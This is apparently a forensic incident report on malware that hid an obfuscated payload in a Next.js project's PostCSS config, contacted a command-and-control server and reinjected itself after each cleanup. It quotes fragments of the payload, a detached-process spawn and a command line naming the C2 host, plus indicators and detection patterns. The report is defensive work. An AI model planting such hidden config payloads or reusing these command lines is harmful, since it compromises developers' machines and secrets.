# Forensic Incident Report: Developer Supply-Chain Malware (PolinRider)

**Incident Date:** September 11, 2026  
**Target Repository:** `talk2nebiah`  
**Classification:** Supply-Chain Poisoning / Remote Access Trojan (RAT) / In-Memory Exfiltration Worm  
**Known Threat Family:** PolinRider / CryptoDrainer Worm  
**Status:** Resolved & Neutralized  

---

## 1. Executive Summary

On September 11, 2026, an investigation was initiated following continuous production deployment failures on Vercel for the `talk2nebiah` application (commit `4aae618`). Vercel build logs reported syntax and module resolution crashes originating from `postcss.config.mjs`.

Forensic investigation revealed that the repository was targeted by a developer supply-chain malware variant known as **PolinRider**. The malware appended an obfuscated JavaScript payload to `postcss.config.mjs`. When executed during local builds and Next.js development server runs, the script spawned an in-memory, detached background Node.js process (**PID 4352**) communicating with a Command & Control (C2) server at `193.247.144.38:443`.

The active host process monitored the local filesystem and continuously re-injected the malicious payload into `postcss.config.mjs` whenever the file was cleaned, causing multiple failed cleanup attempts in the git history until the rogue process was located and killed.

---

## 2. Attack Architecture & Technical Flow

```
[Infected postcss.config.mjs]
         │
         ▼ (Evaluated by Next.js / PostCSS during 'npm run dev' or build)
[Decodes Blockchain RPC Endpoint] ──► Obtains live C2 IP (193.247.144.38)
         │
         ▼ (Spawns detached background Node process with windowsHide: true)
[In-Memory Host Process (PID 4352)] ──► Active TLS connection to 193.247.144.38:443
         │
         ├─► Dynamically evaluates stage-2 payload (eval)
         └─► Filesystem Watcher on developer's workspace
                 │
                 ▼ (Detects whenever postcss.config.mjs is cleaned)
         [Instantly re-injects malicious code into postcss.config.mjs]
```

### 2.1 Stage 1: The Dropper (`postcss.config.mjs`)
The attacker targeted PostCSS because modern web frameworks (Next.js, Tailwind, Vite) automatically execute PostCSS configuration files with full Node.js privileges during build and development.

The malicious code was appended after hundreds of spaces on line 11, making it invisible without horizontal scrolling:
```javascript
export default config;                                                        global.i="A10-*5290";const _0xebf787=_0x1ece;...
```

### 2.2 Stage 2: Blockchain-Based Dead-Drop Resolvers
To evade static IP blocking and domain takedowns, the script uses blockchain RPCs (`rpcCall`, `candidateBlocks`, `lastSenderTx`). It connects to public Ethereum/EVM RPC nodes to read transactions from specific wallet addresses, dynamically extracting the C2 server IP address (`193.247.144.38`).

### 2.3 Stage 3: In-Memory RAT Execution
The script then downloaded and executed a secondary payload using Node's `spawn`:
```javascript
spawn('node', ['-e', '...'], { detached: true, stdio: 'ignore', windowsHide: true }).unref();
```
This created a detached background process on the developer's system:
- **Process ID:** `4352`
- **Command Line:** `node -e "global['_V']='A10-*5290';global['e']=\"app-vscode-eval\";global['_t_s']='http://193.247.144.38:443';global['_t_u']='http://193.247.144.38:80'..."`
- **Network Activity:** `TCP 10.15.61.121:61348 -> 193.247.144.38:443 (ESTABLISHED)`

### 2.4 Stage 4: Persistent Re-Infection Loop
The resident process (PID 4352) placed a file watcher on local configuration files (`postcss.config.*`, `vite.config.*`, `tailwind.config.*`). Whenever the developer or an IDE cleaned the file, the background worker detected the file write and immediately appended the obfuscated payload again.

This explains the repeated commits in the git log:
1. `fix: purge malware from postcss.config.mjs`
2. `fix: purge reinfected malware from postcss.config.mjs (2nd occurrence)`
3. `fix: purge postcss malware (3rd occurrence) and bust Vercel build cache`

In commit `4aae618`, the file was reinfected right as it was committed, causing the malicious code to be pushed to GitHub and pulled by Vercel.

### 2.5 Stage 5: The Vercel Build Crash
When Vercel ran Next.js 16.1.5 (Turbopack), Turbopack parsed `postcss.config.mjs` with its Rust-based ECMAScript parser. The injected script contained conflicting CommonJS and ESM declarations (`createRequire`, `require`), which Turbopack rejected with:
```
SyntaxError: Identifier 'require' has already been declared
the name `createRequire` is defined multiple times
Module not found: Can't resolve <dynamic>
```
This prevented the malicious code from successfully completing its build execution on Vercel's build machines.

---

## 3. Threat Containment & Remediation

| Step | Action Taken | Status |
|---|---|---|
| **Process Termination** | Force-terminated PID `4352` (`node.exe`) | Completed |
| **Network Teardown** | Verified all connections to `193.247.144.38` were severed | Verified (0 connections) |
| **File Restoration** | Restored `postcss.config.mjs` to clean 8-line configuration | Clean (94 bytes) |
| **System Audit** | Inspected Windows Registry Run keys, Task Scheduler, Startup folder, and VS Code extensions | Verified Clean |
| **Build Validation** | Ran full local production build (`next build`) — all 25 routes compiled cleanly in 13.1s | Passed |
| **Remote Sync** | Pushed clean commit `4d089a1` to GitHub `main` branch | Deployed |

---

## 4. Indicators of Compromise (IOCs)

- **C2 IP Address:** `193.247.144.38`
- **C2 Ports:** `80`, `443`
- **Malware Signature Variables:** `A10-*5290`, `_0x1ece`, `_0x1e16`, `app-vscode-eval`, `candidateBlocks`, `lastSenderTx`, `withRpcEndpoints`
- **XOR Encryption Key:** `q4FZkxX{!h,Sr3=@`

---

## 5. Security Recommendations for Developers

1. **Rotate Credentials Immediately:**
   Because the malware process had memory access and established outbound C2 connectivity, all environment secrets present on the machine should be rotated:
   - Paystack API Keys (Secret and Public)
   - WhatsApp Access Token & Webhook Verify Token
   - Database Connection String (`DATABASE_URL`)
   - AI Provider API Keys (`AI_API_KEY`)
2. **Package Manager Consistency:**
   Ensure only `npm` is used in this repository to avoid conflicting lockfiles or `pnpm` moving packages to `.ignored`.
3. **Pre-commit Integrity Hook:**
   Maintain `.git/hooks/pre-commit` to reject any commits containing obfuscated patterns (`_0x`, `global.i=`).
